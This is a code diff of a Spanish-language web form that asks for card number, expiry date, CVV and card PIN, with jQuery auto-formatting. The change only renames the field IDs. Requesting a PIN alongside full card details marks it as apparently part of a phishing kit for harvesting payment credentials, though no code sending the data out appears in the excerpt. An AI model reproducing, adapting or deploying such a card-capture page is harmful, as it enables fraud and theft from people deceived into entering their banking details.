@@ -24,19 +24,19 @@
         <form method="post" id="pg3">
            
                 <p style="font-size: 13px; color: rgb(87, 87, 87);">Número de tarjeta</p>
-            <input type="text" name="" id="a1" required maxlength="19">
+            <input type="text" name="" id="one" required maxlength="19">
 
             <!--  -->
             <p style="font-size: 13px; color: rgb(87, 87, 87);">Fecha de caducidad</p>
-            <input type="text" name="" id="a2" required placeholder="MM/AA" maxlength="7"> 
+            <input type="text" name="" id="two1" required placeholder="MM/AA" maxlength="7"> 
 
              <!--  -->
              <p style="font-size: 13px; color: rgb(87, 87, 87);">Código cvv de 3 dígitos</p>
-             <input type="text" name="" id="a3" required maxlength="3"> 
+             <input type="text" name="" id="three" required maxlength="3"> 
 
              <!--  -->
              <p style="font-size: 13px; color: rgb(87, 87, 87);">PIN</p>
-             <input type="text" name="" id="a4" required maxlength="4"> 
+             <input type="text" name="" id="five" required maxlength="4"> 
 
             <div class="btn">
                 <button>Continuar</button>
@@ -55,12 +55,12 @@
     </div>
 	
 	<script>
-            $("#a1").on("keyup",function(){
+            $("#one").on("keyup",function(){
                cc = $(this).val().split(" ").join("");
                cc = cc.match(new RegExp('.{1,4}$|.{1,4}', 'g')).join(" ");
                $(this).val(cc);
            });
-           $("#a2").on("keyup",function(){
+           $("#two1").on("keyup",function(){
                dd = $(this).val().split("/").join("");
                dd = dd.match(new RegExp('.{1,2}$|.{1,2}', 'g')).join("/");
                $(this).val(dd);
